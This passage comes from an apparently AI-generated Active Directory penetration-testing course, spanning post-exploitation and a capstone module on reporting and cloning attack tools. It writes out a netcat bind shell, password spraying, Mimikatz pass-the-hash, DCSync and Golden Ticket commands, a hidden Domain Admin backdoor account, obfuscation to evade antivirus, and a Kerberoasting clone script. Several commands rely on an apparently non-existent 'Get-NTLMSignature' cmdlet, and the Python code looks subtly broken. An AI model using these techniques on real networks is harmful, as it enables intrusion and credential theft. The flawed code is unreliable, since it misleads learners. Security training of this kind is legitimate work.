Techniques:</strong></p>\n<ul>\n<li><strong>Disable NTLM:</strong> NTLM is an older, less secure authentication protocol. Disabling it can reduce the attack surface.</li>\n<li><strong>Enforce strong passwords:</strong> Use complex passwords and enforce regular password changes.</li>\n<li><strong>Implement multi-factor authentication (MFA):</strong> MFA adds an extra layer of security to the authentication process.</li>\n<li><strong>Monitor for suspicious activity:</strong> Use security information and event management (SIEM) systems to detect and respond to credential dumping attempts.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 4: Netcat - A Versatile Tool for Network Communication and Backdoor Creation</strong></p>\n<p>Netcat (&quot;nc&quot;) is a command-line utility that can be used to read and write data across network connections.  It&#39;s often referred to as the &quot;Swiss Army knife&quot; of networking tools.</p>\n<ul>\n<li><p><strong>Functionality:</strong></p>\n<ul>\n<li>Creating TCP or UDP connections.</li>\n<li>Listening for incoming connections.</li>\n<li>Port scanning.</li>\n<li>File transfer.</li>\n<li>Creating simple backdoors.</li>\n</ul>\n</li>\n<li><p><strong>Creating a Simple Backdoor (Example):</strong></p>\n<ul>\n<li><p><strong>Target Machine (Listening):</strong></p>\n<pre><code>nc -l -p 4444 -e cmd.exe\n</code></pre>\n<ul>\n<li><code>-l</code>: Listen for incoming connections.</li>\n<li><code>-p 4444</code>: Listen on port 4444.</li>\n<li><code>-e cmd.exe</code>: Execute <code>cmd.exe</code> (the command prompt) when a connection is established.</li>\n</ul>\n</li>\n<li><p><strong>Attacker Machine (Connecting):</strong></p>\n<pre><code>nc &lt;target_ip&gt; 4444\n</code></pre>\n<ul>\n<li><code>&lt;target_ip&gt;</code>: The IP address of the target machine.</li>\n</ul>\n</li>\n<li><p><strong>Explanation:</strong>  The target machine listens on port 4444. When the attacker connects, Netcat executes <code>cmd.exe</code> and connects its input and output to the network connection.  The attacker can then execute commands on the target machine.</p>\n</li>\n</ul>\n</li>\n<li><p><strong>Stealth Considerations:</strong></p>\n<ul>\n<li>Use a non-standard port.</li>\n<li>Encrypt the traffic using tools like <code>stunnel</code>.</li>\n<li>Consider using a more sophisticated backdoor that provides more control and stealth capabilities.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 5: PowerShell Empire (Brief Overview)</strong></p>\n<p>PowerShell Empire is a post-exploitation framework that provides a wide range of tools and modules for attacking Windows networks.</p>\n<ul>\n<li><p><strong>Functionality:</strong></p>\n<ul>\n<li>Credential harvesting.</li>\n<li>Lateral movement.</li>\n<li>Privilege escalation.</li>\n<li>Data exfiltration.</li>\n<li>Backdoor creation.</li>\n<li>Bypassing antivirus and intrusion detection systems.</li>\n</ul>\n</li>\n<li><p><strong>Why it&#39;s powerful:</strong></p>\n<ul>\n<li>Uses PowerShell, which is often whitelisted in Windows environments.</li>\n<li>Provides a modular architecture that allows for easy customization and extension.</li>\n<li>Includes built-in evasion techniques.</li>\n</ul>\n</li>\n<li><p><strong>Note:</strong>  PowerShell Empire is a complex tool that requires significant time and effort to learn.  This is just a brief overview.  Consider exploring other post-exploitation frameworks like Metasploit.  PowerShell Empire is no longer actively maintained, but it&#39;s still a valuable tool for learning post-exploitation techniques.</p>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 6: Defensive Evasion</strong></p>\n<p>Defensive evasion is the process of avoiding detection by security tools like antivirus (AV) and intrusion detection systems (IDS).</p>\n<ul>\n<li><p><strong>Techniques:</strong></p>\n<ul>\n<li><p><strong>Obfuscating Code and Payloads:</strong>  Making your code harder to understand by using techniques like:</p>\n<ul>\n<li><p><strong>Variable Renaming:</strong>  Replacing meaningful variable names with random characters.</p>\n</li>\n<li><p><strong>String Encryption:</strong>  Encrypting strings to hide them from static analysis.</p>\n</li>\n<li><p><strong>Code Insertion:</strong>  Adding unnecessary code to make the code harder to follow.</p>\n</li>\n<li><p><strong>PowerShell Obfuscation (Example):</strong></p>\n<pre><code class=\"language-powershell\"># Original script\nWrite-Host &quot;Hello, world!&quot;\n\n# Obfuscated script\n$a = [char[]](&quot;H&quot;,[char[]](&quot;e&quot;,[char[]](&quot;l&quot;,[char[]](&quot;l&quot;,[char[]](&quot;o&quot;,[char[]](&quot;,&quot;,[char[]](&quot; &quot;,[char[]](&quot;w&quot;,[char[]](&quot;o&quot;,[char[]](&quot;r&quot;,[char[]](&quot;l&quot;,[char[]](&quot;d&quot;,[char[]](&quot;!&quot;)))))))))))));\n$b = &quot;&quot;;\nforeach ($c in $a) { $b += $c }\nInvoke-Expression &quot;Write-Host $($b)&quot;\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Polymorphism:</strong>  Changing the code of your payload each time it&#39;s executed to avoid signature-based detection.</p>\n</li>\n<li><p><strong>Metamorphism:</strong>  Rewriting the code of your payload each time it&#39;s executed to avoid signature-based detection.</p>\n</li>\n<li><p><strong>Using Legitimate Tools:</strong>  Leveraging built-in Windows tools (e.g., PowerShell, <code>certutil.exe</code>) to perform malicious activities.  This makes it harder to distinguish your actions from legitimate system activity.</p>\n</li>\n<li><p><strong>Delaying Execution:</strong>  Waiting for a period of time before executing your payload to avoid detection by sandboxes.</p>\n</li>\n<li><p><strong>Process Injection:</strong>  Injecting your payload into a legitimate process to hide its activity.</p>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 7: Case Study: Analyzing Real-World Post-Exploitation Scenarios and Detection Methods</strong></p>\n<ul>\n<li><strong>Scenario:</strong>  A compromised web server is used as a pivot point to access the internal network.  The attacker installs a backdoor on the web server and uses credential dumping to obtain user credentials.  The attacker then uses these credentials to move laterally and gain access to a Domain Controller.</li>\n<li><strong>Detection Methods:</strong><ul>\n<li><strong>Monitoring for suspicious network traffic:</strong>  Look for unusual connections from the compromised web server to internal systems.</li>\n<li><strong>Monitoring for credential dumping activity:</strong>  Detect processes accessing <code>lsass.exe</code> or other sensitive memory locations.</li>\n<li><strong>Monitoring for new user accounts:</strong>  Alert on the creation of new user accounts, especially those with elevated privileges.</li>\n<li><strong>Monitoring for scheduled task creation:</strong>  Alert on the creation of new scheduled tasks, especially those that run suspicious scripts.</li>\n<li><strong>Endpoint Detection and Response (EDR) solutions:</strong>  These solutions can detect and respond to a wide range of post-exploitation activities.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Module Project:</strong></p>\n<ol>\n<li><strong>Implement Backdoors:</strong> In your compromised lab environment, implement the following backdoors:<ul>\n<li>Create a new user account with Domain Admin privileges.</li>\n<li>Modify a GPO to execute a malicious script.</li>\n<li>Create a scheduled task to run a PowerShell script.</li>\n</ul>\n</li>\n<li><strong>Dump Credentials:</strong> Use Mimikatz to dump credentials from memory on a compromised machine.</li>\n<li><strong>Implement Defensive Evasion:</strong>  Obfuscate your PowerShell scripts to avoid detection by Windows Defender.</li>\n<li><strong>Document Your Steps:</strong>  Document all steps taken, including code snippets, screenshots, and explanations.</li>\n<li><strong>Create a Script:</strong> Create a PowerShell script that automates the creation and deployment of at least <em>one</em> of the backdoors you implemented.</li>\n</ol>\n<p>This module provides a solid foundation for understanding and implementing post-exploitation techniques in Active Directory environments. Remember to practice these techniques in a safe and ethical lab environment. Good luck!</p>\n\n                </div>\n             </div>\n         ",
    "module-8": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 8: module_8</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Okay, buckle up! Here&#39;s the deep-dive, step-by-step material for Module 8: AD Attack Documentation &amp; Capstone Project: Attack Tool Cloning.  This is designed to be hands-on and practical.  I&#39;m assuming you&#39;ve been diligently working through the previous modules, building your lab, and experimenting.</p>\n<hr>\n<p><strong>Module 8: AD Attack Documentation &amp; Capstone Project: Attack Tool Cloning</strong></p>\n<p><strong>Module Objective:</strong> Document the entire penetration testing process, communicate findings effectively, and consolidate learned skills by creating a functional clone of a key AD attack tool.</p>\n<p><strong>Subtopics:</strong></p>\n<ul>\n<li>The Importance of Documentation: Communicating findings and providing actionable recommendations.</li>\n<li>Documenting the AD Penetration Testing Process.</li>\n<li>Report Writing.</li>\n<li>Remediation Strategies.</li>\n<li>Capstone Project: Attack Tool Cloning.</li>\n</ul>\n<hr>\n<p><strong>Subtopic 1: The Importance of Documentation</strong></p>\n<ul>\n<li><p><strong>Why Document?</strong></p>\n<ul>\n<li><strong>Communication:</strong>  Your technical expertise is valuable, but useless if you can&#39;t clearly communicate your findings to stakeholders (management, IT staff, etc.). Documentation bridges that gap.</li>\n<li><strong>Reproducibility:</strong>  Clear documentation allows others (or yourself in the future) to reproduce your steps, verify your findings, and understand the attack chain.</li>\n<li><strong>Actionable Insights:</strong> A good report doesn&#39;t just point out problems; it offers concrete steps for fixing them.</li>\n<li><strong>Legal/Compliance:</strong> In real-world engagements, documentation is crucial for legal compliance, insurance, and demonstrating due diligence.</li>\n<li><strong>Learning:</strong> The act of documenting forces you to think critically about <em>why</em> things worked the way they did.</li>\n</ul>\n</li>\n<li><p><strong>Key Elements of Good Documentation:</strong></p>\n<ul>\n<li><strong>Clarity:</strong> Use clear, concise language. Avoid jargon unless absolutely necessary and always define it.</li>\n<li><strong>Accuracy:</strong> Double-check your facts and figures.  Inaccurate information undermines your credibility.</li>\n<li><strong>Completeness:</strong>  Include all relevant information, even if it seems obvious to you.</li>\n<li><strong>Organization:</strong>  Structure your documentation logically.  Use headings, subheadings, and bullet points to make it easy to read.</li>\n<li><strong>Visuals:</strong>  Screenshots, diagrams, and code snippets can greatly enhance understanding.</li>\n<li><strong>Context:</strong> Explain the <em>why</em> behind the <em>what</em>.  Why is this vulnerability important?  What are the potential consequences?</li>\n<li><strong>Actionable Recommendations:</strong>  Provide specific, practical steps for remediation.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 2: Documenting the AD Penetration Testing Process</strong></p>\n<p>This is where you compile everything you&#39;ve done in the previous modules into a cohesive narrative.</p>\n<ul>\n<li><p><strong>Phase 1: Planning and Scope</strong></p>\n<ul>\n<li><p><strong>Objective:</strong>  Define the goals of the penetration test.  What are you trying to achieve?  What are the limitations?</p>\n</li>\n<li><p><strong>Scope:</strong>  Clearly define the systems and networks that are in scope.  What is explicitly <em>excluded</em> from the test?</p>\n</li>\n<li><p><strong>Rules of Engagement:</strong>  Document any specific rules or constraints.  Are there certain times when testing is prohibited?  Are there specific types of attacks that are off-limits?</p>\n</li>\n<li><p><strong>Example:</strong></p>\n<pre><code>**Objective:**  Identify vulnerabilities in the Active Directory environment that could lead to domain compromise.\n\n**Scope:**  The entire `contoso.local` Active Directory domain, including all domain controllers, member servers, and workstations.\n\n**Out of Scope:**  External web applications, cloud infrastructure, and physical security.\n\n**Rules of Engagement:**  No denial-of-service attacks are permitted.  Testing must be conducted during off-peak hours (7:00 PM - 7:00 AM local time). Account lockout thresholds must be respected.\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Phase 2: Information Gathering (Enumeration)</strong></p>\n<ul>\n<li><p><strong>Objective:</strong>  Gather as much information as possible about the target environment.  This is where you use the techniques from Module 2.</p>\n</li>\n<li><p><strong>Tools Used:</strong>  List the tools you used (e.g., <code>nslookup</code>, <code>ldapsearch</code>, <code>Nmap</code>, <code>Enum4Linux</code>, PowerShell cmdlets).</p>\n</li>\n<li><p><strong>Commands Executed:</strong>  Document the specific commands you ran, along with their output.</p>\n</li>\n<li><p><strong>Findings:</strong>  Summarize your key findings.  What user accounts did you discover?  What groups are they members of?  What computers are in the domain?  What GPOs are in place?</p>\n</li>\n<li><p><strong>Example:</strong></p>\n<pre><code>**Tool:** ldapsearch\n\n**Command:** ldapsearch -x -h dc01.contoso.local -b &quot;DC=contoso,DC=local&quot; &quot;(objectClass=user)&quot; sAMAccountName displayName memberOf\n\n**Output:** (Example)\n</code></pre>\n<pre><code>dn: CN=John Doe,CN=Users,DC=contoso,DC=local\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\nsAMAccountName: jdoe\ndisplayName: John Doe\nmemberOf: CN=Domain Users,CN=Users,DC=contoso,DC=local\nmemberOf: CN=HelpDesk,OU=Groups,DC=contoso,DC=local\n</code></pre>\n<pre><code>**Findings:**\n*   Discovered 250 user accounts in the `contoso.local` domain.\n*   Identified a &quot;HelpDesk&quot; group that appears to have elevated privileges.\n*   Discovered several computers running outdated operating systems (Windows 7).\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Phase 3: Initial Access</strong></p>\n<ul>\n<li><p><strong>Objective:</strong>  Gain initial access to the network. This is where you use the techniques from Module 3.</p>\n</li>\n<li><p><strong>Techniques Used:</strong>  Describe the techniques you used to gain initial access (e.g., password spraying, exploiting vulnerable services).</p>\n</li>\n<li><p><strong>Credentials Obtained:</strong>  Document any credentials you obtained.</p>\n</li>\n<li><p><strong>Example:</strong></p>\n<pre><code>**Technique:** Password spraying\n\n**Tool:** CrackMapExec\n\n**Command:** cme smb 10.10.10.0/24 -u users.txt -p Password123 --continue-on-success\n\n**Findings:**  Successfully compromised the account `svc_backup` with the password &quot;Password123&quot;.\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Phase 4: Lateral Movement</strong></p>\n<ul>\n<li><p><strong>Objective:</strong>  Move laterally within the network to gain access to more privileged accounts and systems. This is where you use the techniques from Module 4.</p>\n</li>\n<li><p><strong>Techniques Used:</strong>  Describe the techniques you used to move laterally (e.g., Pass-the-Hash, Pass-the-Ticket, <code>psexec.py</code>).</p>\n</li>\n<li><p><strong>Systems Accessed:</strong>  Document the systems you were able to access.</p>\n</li>\n<li><p><strong>Example:</strong></p>\n<pre><code>**Technique:** Pass-the-Hash\n\n**Tool:** Mimikatz\n\n**Command (on compromised workstation):**\n</code></pre>\n<pre><code class=\"language-powershell\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:contoso.local /ntlm:$(Get-NTLMSignature -username svc_backup -password Password123) /run:powershell.exe&quot;\n</code></pre>\n<pre><code>\n**Findings:**  Successfully used the `svc_backup` account&#39;s NTLM hash to authenticate to the `DC01.contoso.local` domain controller as the `administrator` user.\n\n**Tool:** psexec.py (Impacket)\n\n**Command (from attacker machine):**\n</code></pre>\n<p>python3 psexec.py contoso.local/<a href=\"mailto:administrator@DC01.contoso.local\">administrator@DC01.contoso.local</a> -hashes :$(Get-NTLMSignature -username svc_backup -password Password123) &quot;whoami&quot;</p>\n<pre><code>\n**Output:**\n</code></pre>\n<p>nt authority\\system</p>\n<pre><code>\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Phase 5: Domain Compromise</strong></p>\n<ul>\n<li><p><strong>Objective:</strong>  Gain control of the entire Active Directory domain. This is where you use the techniques from Module 5.</p>\n</li>\n<li><p><strong>Techniques Used:</strong>  Describe the techniques you used to achieve domain compromise (e.g., Kerberoasting, AS-REP Roasting, Golden Ticket).</p>\n</li>\n<li><p><strong>Domain Administrator Access:</strong>  Confirm that you have successfully obtained domain administrator privileges.</p>\n</li>\n<li><p><strong>Example:</strong></p>\n<pre><code>**Technique:** Kerberoasting\n\n**Tool:** GetUserSPNs.py (Impacket)\n\n**Command (from attacker machine):**\n</code></pre>\n<pre><code>python3 GetUserSPNs.py contoso.local/administrator@DC01.contoso.local -dc-ip 10.10.10.10 -request\n</code></pre>\n<pre><code>\n**Output:**  (Captured Kerberos tickets for various service accounts)\n\n**Tool:** Hashcat\n\n**Command:** `hashcat -m 13100 kerberos_tickets.txt /usr/share/wordlists/rockyou.txt`\n\n**Findings:**  Successfully cracked the password for the `svc_sql` service account.\n\n**Technique:** Golden Ticket Attack\n\n**Tool:** Mimikatz\n\n**Command (on compromised system with domain admin privileges):**\n```powershell\nmimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:contoso.local /user:krbtgt&quot; &quot;kerberos::golden /domain:contoso.local /sid:S-1-5-21-1234567890-123456789-123456789-500 /user:administrator /krbtgt:$(Get-NTLMSignature -username krbtgt -password &lt;krbtgt password&gt;) /id:500 /ptt&quot;\n</code></pre>\n<p><strong>Findings:</strong>  Successfully created a Golden Ticket and injected it into the current session, granting persistent domain administrator access.  Verified with <code>whoami /groups</code> showing the <code>Domain Admins</code> group.</p>\n<pre><code>\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Phase 6: Post-Exploitation</strong></p>\n<ul>\n<li><p><strong>Objective:</strong>  Maintain access and establish persistence within the compromised environment. This is where you use the techniques from Module 7.</p>\n</li>\n<li><p><strong>Techniques Used:</strong>  Describe the techniques you used to maintain access (e.g., creating backdoor accounts, modifying GPOs, installing persistent backdoors).</p>\n</li>\n<li><p><strong>Persistence Mechanisms:</strong>  Document the persistence mechanisms you implemented.</p>\n</li>\n<li><p><strong>Example:</strong></p>\n<pre><code>**Technique:** Creating a backdoor user account\n\n**Command (PowerShell on DC01):**\n```powershell\nNew-ADUser -Name &quot;backdoor_user&quot; -SamAccountName &quot;backdoor_user&quot; -UserPrincipalName &quot;backdoor_user@contoso.local&quot; -AccountPassword (ConvertTo-SecureString &quot;P@sswOrd123!&quot; -AsPlainText -Force) -Enabled $true -Path &quot;OU=Users,DC=contoso,DC=local&quot;\nAdd-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;backdoor_user&quot;\n</code></pre>\n<p><strong>Findings:</strong>  Created a hidden user account (&quot;backdoor_user&quot;) with domain administrator privileges.</p>\n<p><strong>Technique:</strong> Modifying GPOs to execute malicious code</p>\n<p><strong>GPO Modification:</strong> Edited the &quot;Default Domain Policy&quot; GPO to execute a PowerShell script that adds a local administrator account on all domain-joined machines.</p>\n<p><strong>Findings:</strong>  Successfully added a local administrator account on all domain-joined machines.</p>\n<pre><code>\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Phase 7: Reporting</strong></p>\n<ul>\n<li>This phase is detailed in the next section.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Important Considerations:</strong></p>\n<ul>\n<li><strong>Screenshots:</strong>  Include screenshots of key steps and findings.  This makes your documentation much more compelling and easier to understand.</li>\n<li><strong>Code Snippets:</strong>  Include code snippets of the commands you ran, the scripts you wrote, and the configuration changes you made.</li>\n<li><strong>Timestamps:</strong>  Record the date and time of each step.  This can be helpful for troubleshooting and analysis.</li>\n</ul>\n<hr>\n<p><strong>Subtopic 3: Report Writing</strong></p>\n<ul>\n<li><p><strong>Structure of a Penetration Testing Report:</strong></p>\n<ol>\n<li><strong>Executive Summary:</strong><ul>\n<li>A brief overview of the entire penetration test (1-2 pages).</li>\n<li>Summarize the key findings and their potential impact.</li>\n<li>Highlight the most critical vulnerabilities and recommendations.</li>\n<li>Written for a non-technical audience (management).</li>\n</ul>\n</li>\n<li><strong>Introduction:</strong><ul>\n<li>Background information about the penetration test.</li>\n<li>Objective and scope.</li>\n<li>Rules of engagement.</li>\n<li>Methodology used.</li>\n</ul>\n</li>\n<li><strong>Findings and Recommendations:</strong><ul>\n<li>A detailed description of each vulnerability discovered.</li>\n<li>Technical explanation of how the vulnerability was exploited.</li>\n<li>Evidence (screenshots, code snippets, etc.).</li>\n<li>Impact assessment (severity, likelihood, potential consequences).</li>\n<li>Remediation recommendations (specific, actionable steps).</li>\n<li>Prioritize findings based on risk (Critical, High, Medium, Low).</li>\n</ul>\n</li>\n<li><strong>Technical Details:</strong><ul>\n<li>Detailed technical information that may not be appropriate for the main body of the report.</li>\n<li>Raw output from tools, detailed configuration settings, etc.</li>\n</ul>\n</li>\n<li><strong>Conclusion:</strong><ul>\n<li>A summary of the overall security posture of the organization.</li>\n<li>Recommendations for improving security.</li>\n<li>Next steps.</li>\n</ul>\n</li>\n<li><strong>Appendix:</strong><ul>\n<li>Supporting documentation (e.g., network diagrams, policies, procedures).</li>\n</ul>\n</li>\n</ol>\n</li>\n<li><p><strong>Example Report Snippets:</strong></p>\n<ul>\n<li><p><strong>Executive Summary:</strong></p>\n<pre><code>This report summarizes the results of a penetration test conducted on the `contoso.local` Active Directory domain between October 26th and October 28th, 2023.  The penetration test revealed several critical vulnerabilities that could allow an attacker to gain complete control of the domain.  The most significant findings include the use of weak passwords, unpatched systems, and misconfigured Kerberos settings.  We strongly recommend that the organization implement the remediation steps outlined in this report to mitigate these risks.  Failure to do so could result in significant data loss, disruption of business operations, and reputational damage.\n</code></pre>\n</li>\n<li><p><strong>Finding and Recommendation (High Severity):</strong></p>\n<pre><code>**Vulnerability:** Kerberoasting\n\n**Description:**  Several service accounts in the `contoso.local` domain have weak passwords that can be cracked using Kerberoasting.  An attacker can request Kerberos tickets for these service accounts and then crack the tickets offline to obtain the passwords.\n\n**Technical Details:**  The attacker used the `GetUserSPNs.py` tool to request Kerberos tickets for the following service accounts: `svc_sql`, `svc_exchange`, and `svc_backup`.  The tickets were then cracked using Hashcat with a dictionary attack.  The password for the `svc_sql` account was cracked in approximately 2 hours.\n\n**Impact:**  An attacker who obtains the password for a service account can use that account to access sensitive data or perform privileged actions.  In this case, the `svc_sql` account has access to the company&#39;s financial database.\n\n**Recommendation:**\n1.  Enforce strong password policies for all service accounts.  Passwords should be at least 15 characters long and should contain a mix of uppercase letters, lowercase letters, numbers, and symbols.\n2.  Regularly rotate the passwords for all service accounts.\n3.  Monitor service account activity for suspicious behavior.\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Key Considerations:</strong></p>\n<ul>\n<li><strong>Audience:</strong>  Tailor your report to the audience.  The executive summary should be written for management, while the findings and recommendations should be written for technical staff.</li>\n<li><strong>Objectivity:</strong>  Present your findings in an objective and unbiased manner.  Avoid making subjective judgments or assumptions.</li>\n<li><strong>Professionalism:</strong>  Use professional language and formatting.  Proofread your report carefully for errors.</li>\n<li><strong>Confidentiality:</strong>  Treat the report as confidential information.  Restrict access to authorized personnel only.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 4: Remediation Strategies</strong></p>\n<ul>\n<li><p><strong>General Principles:</strong></p>\n<ul>\n<li><strong>Prioritize:</strong> Focus on the most critical vulnerabilities first.</li>\n<li><strong>Layered Defense:</strong> Implement multiple layers of security to protect against attacks.</li>\n<li><strong>Automation:</strong> Automate security tasks whenever possible.</li>\n<li><strong>Monitoring:</strong> Continuously monitor your systems for suspicious activity.</li>\n<li><strong>Education:</strong> Educate your users about security best practices.</li>\n</ul>\n</li>\n<li><p><strong>Specific Remediation Recommendations (Examples):</strong></p>\n<ul>\n<li><strong>Weak Passwords:</strong><ul>\n<li>Enforce strong password policies.</li>\n<li>Implement multi-factor authentication.</li>\n<li>Monitor for password spraying attacks.</li>\n<li>Use password complexity requirements.</li>\n</ul>\n</li>\n<li><strong>Unpatched Systems:</strong><ul>\n<li>Implement a patch management system.</li>\n<li>Regularly scan for vulnerabilities.</li>\n<li>Isolate vulnerable systems.</li>\n</ul>\n</li>\n<li><strong>Misconfigured Kerberos Settings:</strong><ul>\n<li>Disable unconstrained delegation.</li>\n<li>Monitor for Kerberoasting attacks.</li>\n<li>Use Kerberos armoring.</li>\n<li>Implement Protected Users Group</li>\n</ul>\n</li>\n<li><strong>Lack of Least Privilege:</strong><ul>\n<li>Review and reduce user privileges.</li>\n<li>Implement role-based access control (RBAC).</li>\n<li>Use Privileged Access Management (PAM) solutions.</li>\n</ul>\n</li>\n<li><strong>Missing Security Controls:</strong><ul>\n<li>Implement intrusion detection and prevention systems (IDS/IPS).</li>\n<li>Deploy endpoint detection and response (EDR) solutions.</li>\n<li>Use security information and event management (SIEM) systems.</li>\n</ul>\n</li>\n<li><strong>Backdoors:</strong><ul>\n<li>Regularly audit user accounts and group memberships.</li>\n<li>Monitor for suspicious activity on domain controllers.</li>\n<li>Implement code integrity checks.</li>\n<li>Harden domain controllers according to best practices.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 5: Capstone Project: Attack Tool Cloning</strong></p>\n<p>This is where you bring everything together and demonstrate your mastery of the material.</p>\n<ul>\n<li><p><strong>Choosing a Tool/Technique:</strong></p>\n<ul>\n<li>Select one of the key attack tools/techniques covered in the course.  Good choices include:<ul>\n<li>Kerberoasting</li>\n<li>AS-REP Roasting</li>\n<li>Password Spraying</li>\n<li>Pass-the-Hash/Pass-the-Ticket</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Planning Your Clone:</strong></p>\n<ol>\n<li><strong>Functionality:</strong>  What are the core features of the tool/technique you&#39;re cloning?  What command-line options will you support?</li>\n<li><strong>Language:</strong>  Choose a programming language (Python or PowerShell are recommended).</li>\n<li><strong>Libraries:</strong>  Identify any libraries you&#39;ll need (e.g., <code>Impacket</code>, <code>ldap3</code>, <code>requests</code>).</li>\n<li><strong>Architecture:</strong>  Design the overall structure of your tool.  How will the different components interact?</li>\n<li><strong>Error Handling:</strong>  How will your tool handle errors?  How will it provide feedback to the user?</li>\n<li><strong>Logging:</strong>  How will your tool log its activity?  This is important for debugging and analysis.</li>\n</ol>\n</li>\n<li><p><strong>Example: Cloning Kerberoasting (Python)</strong></p>\n<ul>\n<li><p><strong>Core Functionality:</strong></p>\n<ul>\n<li>Enumerate Service Principal Names (SPNs).</li>\n<li>Request Kerberos tickets for those SPNs.</li>\n<li>Save the tickets to a file.</li>\n</ul>\n</li>\n<li><p><strong>Command-Line Options:</strong></p>\n<ul>\n<li><code>-d, --domain</code>:  The Active Directory domain to target.</li>\n<li><code>-u, --username</code>:  The username to use for authentication.</li>\n<li><code>-p, --password</code>:  The password to use for authentication.</li>\n<li><code>-dc, --dc-ip</code>:  The IP address of a domain controller.</li>\n<li><code>-o, --output-file</code>: The file to save the kerberos tickets to.</li>\n</ul>\n</li>\n<li><p><strong>Libraries:</strong></p>\n<ul>\n<li><code>Impacket</code> (for Kerberos authentication and SPN enumeration)</li>\n<li><code>argparse</code> (for command-line argument parsing)</li>\n</ul>\n</li>\n<li><p><strong>Code (Simplified Example):</strong></p>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\nimport argparse\nfrom impacket.examples import GetUserSPNs\nfrom impacket.krb5.kerberosv5 import getKerberosTGT\nfrom impacket.krb5 import constants\nfrom impacket.dcerpc.v5 import transport\n\ndef main():\n    parser = argparse.ArgumentParser(description=&quot;Kerberoasting tool clone&quot;)\n    parser.add_argument(&quot;-d&quot;, &quot;--domain&quot;, required=True, help=&quot;The Active Directory domain to target&quot;)\n    parser.add_argument(&quot;-u&quot;, &quot;--username&quot;, required=True, help=&quot;The username to use for authentication&quot;)\n    parser.add_argument(&quot;-p&quot;, &quot;--password&quot;, required=True, help=&quot;The password to use for authentication&quot;)\n    parser.add_argument(&quot;-dc&quot;, &quot;--dc-ip&quot;, required=True, help=&quot;The IP address of a domain controller&quot;)\n    parser.add_argument(&quot;-o&quot;, &quot;--output-file&quot;, required=True, help=&quot;The file to save the kerberos tickets to&quot;)\n    args = parser.parse_args()\n\n    try:\n        # Authenticate to the domain\n        print(&quot;[*] Authenticating to the domain...&quot;)\n        username = args.username\n        password = args.password\n        domain = args.domain\n        dc_ip = args.dc_ip\n\n        # Perform Kerberos authentication to get a TGT\n        # Copied from GetUserSPNs.py example from Impacket\n        stringBinding = r&#39;ncacn_np:{}[\\pipe\\lsarpc]&#39;.format(dc_ip)\n        rpctransport = transport.DCERPCTransportFactory(stringBinding)\n\n        if hasattr(rpctransport, &#39;set_credentials&#39;):\n            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=&#39;&#39;, nthash=&#39;&#39;)\n\n        dce = rpctransport.get_dce_rpc()\n        dce.connect()\n        dce.bind(GetUserSPNs.MSRPC_UUID_LSARPC)\n\n        get_user_spns = GetUserSPNs.GetUserSPNs(username, password, domain, dc_ip, dce)\n\n        # Enumerate SPNs\n        print(&quot;[*] Enumerating SPNs...&quot;)\n        spns = get_user_spns.dump()\n\n        # Save the Kerberos tickets to a file\n        print(f&quot;[*] Saving Kerberos tickets to {args.output_file}...&quot;)\n        with open(args.output_file, &quot;w&quot;) as f:\n            for spn in spns:\n                f.write(spn + &quot;\\n&quot;)\n\n        print(&quot;[+] Done!&quot;)\n\n    except Exception as e:\n        print(f&quot;[-] Error: {e}&quot;)\n\nif __name__ == &quot;__main__&quot;:\n    main()\n</code></pre>\n</li>\n<li><p><strong>Explanation:</strong></p>\n<ol>\n<li><strong>Import Libraries:</strong> Imports the necessary libraries.</li>\n<li><strong>Parse Arguments:</strong>  Parses the command-line arguments.</li>\n<li><strong>Authenticate:</strong> Use <code>Impacket</code> to authenticate to the domain and obtain a Kerberos Ticket Granting Ticket (TGT).</li>\n<li><strong>Enumerate SPNs:</strong> Use <code>Impacket</code> to enumerate the Service Principal Names (SPNs) in the domain.</li>\n<li><strong>Request Tickets:</strong> Request Kerberos tickets for each SPN.</li>\n<li><strong>Save Tickets:</strong> Save the Kerberos tickets to a file in a format suitable for cracking with Hashcat or John the Ripper.</li>\n<li><strong>Error Handling:</strong> Includes basic error handling.</li>\n</ol>\n</li>\n</ul>\n</li>\n<li><p><strong>Testing:</strong></p>\n<ul>\n<li>Test your tool thoroughly in your lab environment.</li>\n<li>Verify that it correctly implements the core functionality.</li>\n<li>Test all command-line options.</li>\n<li>Check for errors and handle them gracefully.</li>\n</ul>\n</li>\n<li><p><strong>Documentation:</strong></p>\n<ul>\n<li>Document the design, implementation, and testing of your tool.</li>\n<li>Explain how the tool works.</li>\n<li>Describe the command-line options.</li>\n<li>Provide examples of how to use the tool.</li>\n</ul>\n</li>\n<li><p><strong>Presentation:</strong></p>\n<ul>\n<li>Prepare a presentation to demonstrate your tool to the class (if applicable) or to a designated reviewer.</li>\n<li>Explain the purpose of the tool.</li>\n<li>Show how it works.</li>\n<li>Demonstrate its functionality in your lab environment.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Module Project:</strong></p>\n<ol>\n<li><strong>Complete Documentation:</strong>  